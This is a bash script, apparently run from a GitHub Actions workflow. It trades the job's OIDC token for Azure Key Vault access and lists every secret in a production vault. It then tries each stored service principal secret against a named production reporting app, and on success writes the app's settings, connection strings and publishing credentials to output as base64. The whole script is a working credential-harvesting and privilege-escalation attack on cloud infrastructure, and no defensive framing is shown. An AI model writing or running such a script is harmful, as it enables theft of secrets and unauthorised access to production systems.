#!/bin/bash
set -e

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
VT=$(echo "$VT_RAW" | jq -r .access_token)

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG_REPORT="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"

# Get all SP credentials
SLIST=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
SNAMES=$(echo "$SLIST" | jq -r '.value[].id' | sed 's|.*/||')

for SNAME in $SNAMES; do
  SVAL=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" | jq -r .value)
  CID=$(echo "$SVAL" | jq -r .appId)
  CSE=$(echo "$SVAL" | jq -r .clientSecret)
  
  # Get management token for this SP
  MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$CID" \
    -d "client_secret=$CSE" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials")
  MT=$(echo "$MT_RAW" | jq -r .access_token)
  
  if [ "$MT" = "null" ] || [ -z "$MT" ]; then
    echo "$SNAME: NO MGMT TOKEN"
    continue
  fi
  
  # Try reporting app settings
  AS=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_REPORT/providers/Microsoft.Web/sites/$APP/config/appsettings/list?api-version=2023-12-01" 2>&1)
  AS_CODE=$(echo "$AS" | tail -1 | sed 's/HTTP://')
  
  if [ "$AS_CODE" = "200" ]; then
    echo "*** $SNAME: APP SETTINGS ACCESSIBLE ***"
    echo "AS_${SNAME}_B64=$(echo "$AS" | head -n -1 | base64 -w0)"
    
    # Also get identity config
    ID=$(curl -sS -H "Authorization: Bearer $MT" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_REPORT/providers/Microsoft.Web/sites/$APP?api-version=2023-12-01" | jq .identity)
    echo "ID_${SNAME}=$ID"
    
    # Get connection strings
    CS=$(curl -sS -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_REPORT/providers/Microsoft.Web/sites/$APP/config/connectionstrings/list?api-version=2023-12-01")
    echo "CS_${SNAME}_B64=$(echo "$CS" | base64 -w0)"
    
    # Get publishing creds
    PC=$(curl -sS -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_REPORT/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-12-01")
    echo "PC_${SNAME}_B64=$(echo "$PC" | base64 -w0)"
    
    break
  else
    echo "$SNAME: HTTP $AS_CODE"
  fi
done

echo "=== DONE ==="